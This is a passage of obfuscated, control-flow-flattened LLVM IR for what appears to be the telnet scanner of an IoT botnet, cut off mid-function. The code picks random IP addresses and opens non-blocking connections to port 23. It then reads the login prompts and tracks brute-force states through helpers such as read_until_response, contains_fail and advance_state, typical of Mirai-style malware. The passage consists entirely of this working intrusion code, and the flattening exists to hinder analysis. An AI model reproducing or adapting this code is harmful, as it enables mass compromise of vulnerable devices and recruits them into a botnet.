  %33 = getelementptr inbounds [8 x i8], [8 x i8]* %32, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 8, i32 4, i1 false)
  %34 = call noalias i8* @malloc(i64 1025) #3
  store i8* %34, i8** %17, align 8
  %35 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %35, i8 0, i64 1025, i32 1, i1 false)
  %36 = load i32, i32* %11, align 4
  %37 = zext i32 %36 to i64
  %38 = call i8* @llvm.stacksave()
  store i8* %38, i8** %19, align 8
  %39 = alloca %struct.telstate_t, i64 %37, align 16
  %40 = load i32, i32* %11, align 4
  %41 = zext i32 %40 to i64
  store i64 %41, i64* %.reg2mem
  %.reload16 = load volatile i64, i64* %.reg2mem
  %42 = alloca i32, i64 %.reload16, align 16
  %43 = bitcast %struct.telstate_t* %39 to i8*
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = mul i64 %45, 5
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 %46, i32 16, i1 false)
  store i32 0, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -1166200054, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar15 = load i32, i32* %switchVar
  switch i32 %switchVar15, label %switchDefault [
    i32 -1166200054, label %47
    i32 190833687, label %52
    i32 -171543747, label %66
    i32 1572606478, label %69
    i32 -691703364, label %70
    i32 474241601, label %78
    i32 1687413120, label %79
    i32 -1531340756, label %80
    i32 -1782709863, label %81
    i32 1797871014, label %82
    i32 -2032192033, label %87
    i32 -470312841, label %95
    i32 -182753574, label %102
    i32 -542931524, label %NodeBlock13
    i32 -370164235, label %NodeBlock11
    i32 352254187, label %NodeBlock9
    i32 1760064047, label %LeafBlock7
    i32 903286507, label %NodeBlock5
    i32 1161150006, label %NodeBlock3
    i32 -1601702380, label %NodeBlock1
    i32 1281415875, label %NodeBlock
    i32 -967863340, label %LeafBlock
    i32 375556709, label %118
    i32 771664353, label %127
    i32 1298059502, label %147
    i32 994354637, label %156
    i32 1277324779, label %179
    i32 1366591555, label %184
    i32 1493222972, label %193
    i32 -435910579, label %198
    i32 19948791, label %199
    i32 -16068087, label %200
    i32 -1828290137, label %225
    i32 1675779990, label %226
    i32 1281523344, label %249
    i32 -1922216039, label %254
    i32 759046986, label %258
    i32 -288858167, label %262
    i32 -1693813226, label %263
    i32 -1395481842, label %264
    i32 -1370778464, label %273
    i32 -97225811, label %274
    i32 1390908623, label %308
    i32 -1084581818, label %319
    i32 449810091, label %323
    i32 940304081, label %340
    i32 -1395183842, label %341
    i32 -1789971928, label %345
    i32 -1069024710, label %349
    i32 1813799376, label %350
    i32 -1353487400, label %361
    i32 -1770701211, label %365
    i32 843171336, label %366
    i32 666524311, label %381
    i32 -2022653290, label %390
    i32 -839647380, label %394
    i32 1208138382, label %398
    i32 -1817030126, label %399
    i32 -651978557, label %410
    i32 1548756092, label %414
    i32 -1470089493, label %415
    i32 2022437682, label %441
    i32 462627819, label %445
    i32 -665109480, label %454
    i32 -1987831897, label %458
    i32 178689867, label %462
    i32 193030686, label %477
    i32 206904807, label %486
    i32 -1043958334, label %490
    i32 869179531, label %494
    i32 612724776, label %495
    i32 -33443454, label %506
    i32 2004076529, label %510
    i32 1789990516, label %511
    i32 1955251688, label %541
    i32 -960578241, label %545
    i32 106443132, label %554
    i32 -311485205, label %558
    i32 -1175977077, label %562
    i32 883631623, label %577
    i32 910562608, label %592
    i32 -245250954, label %596
    i32 990592515, label %605
    i32 1964105495, label %614
    i32 -128539623, label %618
    i32 -1283998245, label %644
    i32 -1736099846, label %645
    i32 -1350366063, label %649
    i32 2100238843, label %650
    i32 348981525, label %651
    i32 56619355, label %662
    i32 1334082308, label %666
    i32 -1814353761, label %667
    i32 -1063857844, label %682
    i32 -674068390, label %683
    i32 294824130, label %692
    i32 -1345001751, label %693
    i32 -1400428418, label %705
    i32 1337116694, label %709
    i32 -938525335, label %720
    i32 -508528322, label %729
    i32 -128137673, label %730
    i32 1584602244, label %734
    i32 -672174949, label %NewDefault
    i32 -317523408, label %735
    i32 -1904200318, label %736
    i32 -471328067, label %739
    i32 7625507, label %740
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* %11, align 4
  %50 = icmp slt i32 %48, %49
  %51 = select i1 %50, i32 190833687, i32 1572606478
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %54
  %56 = bitcast %struct.telstate_t* %55 to i8*
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 32, i32 16, i1 false)
  %57 = load i32, i32* %5, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %58
  %60 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %59, i32 0, i32 3
  store i8 1, i8* %60, align 1
  %61 = load i8*, i8** %17, align 8
  %62 = load i32, i32* %5, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %63
  %65 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i32 0, i32 9
  store i8* %61, i8** %65, align 8
  store i32 -171543747, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = load i32, i32* %5, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %5, align 4
  store i32 -1166200054, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -691703364, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %7, align 4
  %72 = add nsw i32 %71, 1
  store i32 %72, i32* %7, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [11 x i8*], [11 x i8*]* @tmpdirs, i64 0, i64 %73
  %75 = load i8*, i8** %74, align 8
  %76 = icmp ne i8* %75, null
  %77 = select i1 %76, i32 474241601, i32 1687413120
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 -691703364, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  store i32 -1531340756, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i32 -1782709863, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 1797871014, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %5, align 4
  %84 = load i32, i32* %11, align 4
  %85 = icmp slt i32 %83, %84
  %86 = select i1 %85, i32 -2032192033, i32 -471328067
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 7
  %92 = load i32, i32* %91, align 16
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 -470312841, i32 -182753574
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = call i64 @time(i64* null) #3
  %97 = trunc i64 %96 to i32
  %98 = load i32, i32* %5, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 7
  store i32 %97, i32* %101, align 16
  store i32 -182753574, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %5, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 2
  %107 = load i8, i8* %106, align 8
  %108 = zext i8 %107 to i32
  store i32 %108, i32* %.reg2mem17
  store i32 -542931524, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload26 = load volatile i32, i32* %.reg2mem17
  %Pivot14 = icmp slt i32 %.reload26, 4
  %109 = select i1 %Pivot14, i32 1161150006, i32 -370164235
  store i32 %109, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload21 = load volatile i32, i32* %.reg2mem17
  %Pivot12 = icmp slt i32 %.reload21, 6
  %110 = select i1 %Pivot12, i32 903286507, i32 352254187
  store i32 %110, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload19 = load volatile i32, i32* %.reg2mem17
  %Pivot10 = icmp slt i32 %.reload19, 7
  %111 = select i1 %Pivot10, i32 -1175977077, i32 1760064047
  store i32 %111, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload18 = load volatile i32, i32* %.reg2mem17
  %SwitchLeaf8 = icmp eq i32 %.reload18, 7
  %112 = select i1 %SwitchLeaf8, i32 -1814353761, i32 -672174949
  store i32 %112, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload20 = load volatile i32, i32* %.reg2mem17
  %Pivot6 = icmp slt i32 %.reload20, 5
  %113 = select i1 %Pivot6, i32 178689867, i32 1789990516
  store i32 %113, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload25 = load volatile i32, i32* %.reg2mem17
  %Pivot4 = icmp slt i32 %.reload25, 2
  %114 = select i1 %Pivot4, i32 1281415875, i32 -1601702380
  store i32 %114, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload22 = load volatile i32, i32* %.reg2mem17
  %Pivot2 = icmp slt i32 %.reload22, 3
  %115 = select i1 %Pivot2, i32 843171336, i32 -1470089493
  store i32 %115, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload24 = load volatile i32, i32* %.reg2mem17
  %Pivot = icmp slt i32 %.reload24, 1
  %116 = select i1 %Pivot, i32 -967863340, i32 -1693813226
  store i32 %116, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload23 = load volatile i32, i32* %.reg2mem17
  %SwitchLeaf = icmp eq i32 %.reload23, 0
  %117 = select i1 %SwitchLeaf, i32 375556709, i32 -672174949
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i32, i32* %5, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %120
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %121, i32 0, i32 3
  %123 = load i8, i8* %122, align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 1
  %126 = select i1 %125, i32 771664353, i32 1298059502
  store i32 %126, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i32, i32* %5, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %129
  %131 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %130, i32 0, i32 9
  %132 = load i8*, i8** %131, align 8
  store i8* %132, i8** %20, align 8
  %133 = load i32, i32* %5, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %134
  %136 = bitcast %struct.telstate_t* %135 to i8*
  call void @llvm.memset.p0i8.i64(i8* %136, i8 0, i64 32, i32 16, i1 false)
  %137 = load i8*, i8** %20, align 8
  %138 = load i32, i32* %5, align 4
  %139 = sext i32 %138 to i64
  %140 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %139
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %140, i32 0, i32 9
  store i8* %137, i8** %141, align 8
  %142 = call i32 @GIP()
  %143 = load i32, i32* %5, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %144
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %145, i32 0, i32 1
  store i32 %142, i32* %146, align 4
  store i32 -16068087, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  %148 = load i32, i32* %5, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %149
  %151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %150, i32 0, i32 3
  %152 = load i8, i8* %151, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 0
  %155 = select i1 %154, i32 994354637, i32 19948791
  store i32 %155, i32* %switchVar
  br label %loopEnd

; <label>:156:                                    ; preds = %loopEntry
  %157 = load i32, i32* %5, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %158
  %160 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %159, i32 0, i32 5
  %161 = load i8, i8* %160, align 1
  %162 = add i8 %161, 1
  store i8 %162, i8* %160, align 1
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %164
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %165, i32 0, i32 4
  %167 = load i8, i8* %166, align 2
  %168 = add i8 %167, 1
  store i8 %168, i8* %166, align 2
  %169 = load i32, i32* %5, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 5
  %173 = load i8, i8* %172, align 1
  %174 = zext i8 %173 to i64
  %.reload = load volatile i64, i64* %.reg2mem
  %175 = mul nuw i64 4, %.reload
  %176 = udiv i64 %175, 8
  %177 = icmp eq i64 %174, %176
  %178 = select i1 %177, i32 1277324779, i32 1366591555
  store i32 %178, i32* %switchVar
  br label %loopEnd

; <label>:179:                                    ; preds = %loopEntry
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 3
  store i8 1, i8* %183, align 1
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:184:                                    ; preds = %loopEntry
  %185 = load i32, i32* %5, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 4
  %189 = load i8, i8* %188, align 2
  %190 = zext i8 %189 to i64
  %191 = icmp eq i64 %190, 0
  %192 = select i1 %191, i32 1493222972, i32 -435910579
  store i32 %192, i32* %switchVar
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* %5, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %195
  %197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %196, i32 0, i32 3
  store i8 1, i8* %197, align 1
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  store i32 19948791, i32* %switchVar
  br label %loopEnd

; <label>:199:                                    ; preds = %loopEntry
  store i32 -16068087, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  %201 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %201, align 4
  %202 = call zeroext i16 @htons(i16 zeroext 23) #10
  %203 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %202, i16* %203, align 2
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %205 = getelementptr inbounds [8 x i8], [8 x i8]* %204, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %205, i8 0, i64 8, i32 4, i1 false)
  %206 = load i32, i32* %5, align 4
  %207 = sext i32 %206 to i64
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %207
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %208, i32 0, i32 1
  %210 = load i32, i32* %209, align 4
  %211 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %212 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %211, i32 0, i32 0
  store i32 %210, i32* %212, align 4
  %213 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %214 = load i32, i32* %5, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %215
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %216, i32 0, i32 0
  store i32 %213, i32* %217, align 16
  %218 = load i32, i32* %5, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 0
  %222 = load i32, i32* %221, align 16
  %223 = icmp eq i32 %222, -1
  %224 = select i1 %223, i32 -1828290137, i32 1675779990
  store i32 %224, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:226:                                    ; preds = %loopEntry
  %227 = load i32, i32* %5, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 0
  %231 = load i32, i32* %230, align 16
  %232 = load i32, i32* %5, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 16
  %237 = call i32 (i32, i32, ...) @fcntl(i32 %236, i32 3, i8* null)
  %238 = or i32 %237, 2048
  %239 = call i32 (i32, i32, ...) @fcntl(i32 %231, i32 4, i32 %238)
  %240 = load i32, i32* %5, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %241
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %242, i32 0, i32 0
  %244 = load i32, i32* %243, align 16
  %245 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %246 = call i32 @connect(i32 %244, %struct.sockaddr* %245, i32 16)
  %247 = icmp eq i32 %246, -1
  %248 = select i1 %247, i32 1281523344, i32 759046986
  store i32 %248, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  %250 = call i32* @__errno_location() #10
  %251 = load i32, i32* %250, align 4
  %252 = icmp ne i32 %251, 115
  %253 = select i1 %252, i32 -1922216039, i32 759046986
  store i32 %253, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  %255 = load i32, i32* %5, align 4
  %256 = sext i32 %255 to i64
  %257 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %256
  call void @reset_telstate(%struct.telstate_t* %257)
  store i32 -288858167, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %5, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %260
  call void @advance_state(%struct.telstate_t* %261, i32 1)
  store i32 -288858167, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:263:                                    ; preds = %loopEntry
  store i32 -1395481842, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %266 = getelementptr inbounds [16 x i64], [16 x i64]* %265, i64 0, i64 0
  %267 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %266) #3, !srcloc !6
  %268 = extractvalue { i64, i64* } %267, 0
  %269 = extractvalue { i64, i64* } %267, 1
  %270 = trunc i64 %268 to i32
  store i32 %270, i32* %21, align 4
  %271 = ptrtoint i64* %269 to i64
  %272 = trunc i64 %271 to i32
  store i32 %272, i32* %22, align 4
  store i32 -1370778464, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  store i32 -97225811, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i32, i32* %5, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = srem i32 %279, 64
  %281 = zext i32 %280 to i64
  %282 = shl i64 1, %281
  %283 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %284 = load i32, i32* %5, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = sdiv i32 %288, 64
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds [16 x i64], [16 x i64]* %283, i64 0, i64 %290
  %292 = load i64, i64* %291, align 8
  %293 = or i64 %292, %282
  store i64 %293, i64* %291, align 8
  %294 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %294, align 8
  %295 = load i32, i32* %3, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %296, i64* %297, align 8
  %298 = load i32, i32* %5, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 16
  %303 = add nsw i32 %302, 1
  %304 = call i32 @select(i32 %303, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %304, i32* %6, align 4
  %305 = load i32, i32* %6, align 4
  %306 = icmp eq i32 %305, 1
  %307 = select i1 %306, i32 1390908623, i32 -1395183842
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %309 = load i32, i32* %5, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %310
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %311, i32 0, i32 0
  %313 = load i32, i32* %312, align 16
  %314 = bitcast i32* %15 to i8*
  %315 = call i32 @getsockopt(i32 %313, i32 1, i32 4, i8* %314, i32* %14) #3
  %316 = load i32, i32* %15, align 4
  %317 = icmp ne i32 %316, 0
  %318 = select i1 %317, i32 -1084581818, i32 449810091
  store i32 %318, i32* %switchVar
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i32, i32* %5, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %321
  call void @reset_telstate(%struct.telstate_t* %322)
  store i32 940304081, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i32, i32* %5, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = call i32 (i32, i32, ...) @fcntl(i32 %333, i32 3, i8* null)
  %335 = and i32 %334, -2049
  %336 = call i32 (i32, i32, ...) @fcntl(i32 %328, i32 4, i32 %335)
  %337 = load i32, i32* %5, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %338
  call void @advance_state(%struct.telstate_t* %339, i32 2)
  store i32 940304081, i32* %switchVar
  br label %loopEnd

; <label>:340:                                    ; preds = %loopEntry
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  %342 = load i32, i32* %6, align 4
  %343 = icmp eq i32 %342, -1
  %344 = select i1 %343, i32 -1789971928, i32 -1069024710
  store i32 %344, i32* %switchVar
  br label %loopEnd

; <label>:345:                                    ; preds = %loopEntry
  %346 = load i32, i32* %5, align 4
  %347 = sext i32 %346 to i64
  %348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %347
  call void @reset_telstate(%struct.telstate_t* %348)
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  store i32 1813799376, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = load i32, i32* %5, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 7
  %355 = load i32, i32* %354, align 16
  %356 = add i32 %355, 5
  %357 = zext i32 %356 to i64
  %358 = call i64 @time(i64* null) #3
  %359 = icmp slt i64 %357, %358
  %360 = select i1 %359, i32 -1353487400, i32 -1770701211
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = load i32, i32* %5, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %363
  call void @reset_telstate(%struct.telstate_t* %364)
  store i32 -1770701211, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  store i32 -317523408, i32* %switchVar
  br label %loopEnd

; <label>:366:                                    ; preds = %loopEntry
  %367 = load i32, i32* %5, align 4
  %368 = sext i32 %367 to i64
  %369 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %368
  %370 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %369, i32 0, i32 0
  %371 = load i32, i32* %370, align 16
  %372 = load i32, i32* %3, align 4
  %373 = load i32, i32* %5, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 9
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @read_until_response(i32 %371, i32 %372, i8* %377, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %379 = icmp ne i32 %378, 0
  %380 = select i1 %379, i32 666524311, i32 -1817030126
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i32, i32* %5, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %383
  %385 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %384, i32 0, i32 9
  %386 = load i8*, i8** %385, align 8
  %387 = call i32 @contains_fail(i8* %386)
  %388 = icmp ne i32 %387, 0
  %389 = select i1 %388, i32 -2022653290, i32 -839647380
  store i32 %389, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %5, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %392
  call void @advance_state(%struct.telstate_t* %393, i32 0)
  store i32 1208138382, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i32, i32* %5, align 4
  %396 = sext i32 %395 to i64
  %397 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %39, i64 %396
  call void @advance_state(%struct.telstate_t* %397, i32 3)
  store i32 1208138382, i32* %switchVar
  br label %loopEnd

; <label>:398:                                    ; preds = %loopEntry
  store i32 -1904200318, i32* %switchVar
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = load i32, i32* %5, align 4
